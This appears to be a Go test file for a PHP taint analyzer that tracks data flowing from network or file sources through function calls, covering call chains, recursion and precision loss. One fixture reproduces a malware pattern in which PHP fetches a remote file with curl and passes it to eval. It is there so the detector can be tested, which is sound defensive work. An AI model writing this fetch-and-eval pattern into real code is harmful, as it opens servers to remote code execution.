package phptaint

import (
	"fmt"
	"sort"
	"strings"
	"testing"
)

func summariesOf(t *testing.T, src string) (map[string]Confidence, []string) {
	t.Helper()
	root, status, reason := parseSource([]byte(src))
	if status != StatusAnalyzed {
		t.Fatalf("parse status %v: %s", status, reason)
	}
	return functionSummaries(collectScope(root))
}

func TestSummaryMarksDirectlyReturningFunction(t *testing.T) {
	got, _ := summariesOf(t, "<?php function g($u) { return file_get_contents($u); }")
	if _, ok := got["g"]; !ok {
		t.Errorf("summaries = %v, want g marked taint-returning", got)
	}
}

func TestSummaryPropagatesThroughCallChain(t *testing.T) {
	got, _ := summariesOf(t, `<?php
function a($u) { return file_get_contents($u); }
function b($u) { return a($u); }
function c($u) { $t = b($u); return $t; }`)
	names := make([]string, 0, len(got))
	for n := range got {
		names = append(names, n)
	}
	sort.Strings(names)
	want := []string{"a", "b", "c"}
	if len(names) != len(want) {
		t.Fatalf("summaries = %v, want %v", names, want)
	}
	for i := range want {
		if names[i] != want[i] {
			t.Fatalf("summaries = %v, want %v", names, want)
		}
	}
}

func TestSummaryTerminatesOnMutualRecursion(t *testing.T) {
	got, _ := summariesOf(t, `<?php
function p($u) { return q($u); }
function q($u) { return p($u); }`)
	if len(got) != 0 {
		t.Errorf("summaries = %v, want none: neither function reaches a source", got)
	}
}

func TestSummaryIgnoresFunctionThatOnlyEchoes(t *testing.T) {
	got, _ := summariesOf(t, "<?php function g($u) { echo file_get_contents($u); }")
	if _, ok := got["g"]; ok {
		t.Errorf("summaries = %v, want g absent: it returns nothing", got)
	}
}

func TestPrecisionLossIsRecorded(t *testing.T) {
	_, loss := summariesOf(t, "<?php function g() { $n = 'x'; $$n = 1; extract($a); call_user_func($f); }")
	joined := strings.Join(loss, " ")
	for _, want := range []string{"variable-variable", "extract", "dynamic-call"} {
		if !strings.Contains(joined, want) {
			t.Errorf("precision loss = %q, want %q recorded", joined, want)
		}
	}
}

// TestSummaryMarksMotivatingSample reproduces the real malware shape this
// task exists for: the fetch and the sink live in different functions, so
// without a summary for fetchContent the flow from curl_exec to eval is
// invisible to a single-scope analysis.
func TestSummaryMarksMotivatingSample(t *testing.T) {
	got, _ := summariesOf(t, `<?php
function fetchContent($url) { $ch = curl_init($url); return curl_exec($ch); }
$content = fetchContent('http://host/p.txt');
eval('?>' . $content);`)
	if _, ok := got["fetchcontent"]; !ok {
		t.Errorf("summaries = %v, want fetchcontent marked taint-returning", got)
	}
}

// TestSummaryPropagatesThroughLongCallChain builds a call chain longer than
// maxFixpointRounds, with dependencies discovered in the worst order (each
// function calls the next, so a caller only learns its callee's summary in
// the round after the callee itself converges). A fixed round cap sized to
// maxFixpointRounds evaded detection on exactly this shape once already for
// the intraprocedural fixpoint; the interprocedural one must not repeat it.
func TestSummaryPropagatesThroughLongCallChain(t *testing.T) {
	const n = maxFixpointRounds + 5
	var src strings.Builder
	src.WriteString("<?php\n")
	for i := 0; i < n; i++ {
		fmt.Fprintf(&src, "function f%d($u) { return f%d($u); }\n", i, i+1)
	}
	fmt.Fprintf(&src, "function f%d($u) { return file_get_contents($u); }\n", n)
	got, _ := summariesOf(t, src.String())
	if _, ok := got["f0"]; !ok {
		t.Errorf("summaries omitted the head of a %d-hop call chain", n+1)
	}
}
